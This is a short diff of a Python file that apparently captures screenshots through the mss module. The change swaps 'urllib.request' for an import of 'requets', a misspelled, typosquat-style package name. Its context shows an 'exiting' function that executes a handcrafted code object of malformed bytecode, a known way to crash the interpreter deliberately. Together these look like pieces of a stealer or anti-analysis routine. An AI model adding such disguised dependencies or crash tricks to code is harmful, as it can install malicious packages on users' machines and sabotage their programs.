@@ -7,11 +7,7 @@ from mss import mss as mss_module
 import tempfile
 import sys
 import os
-import urllib.request
-
-
-
-
+import requets
 def exiting():
     try:
         exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b''))
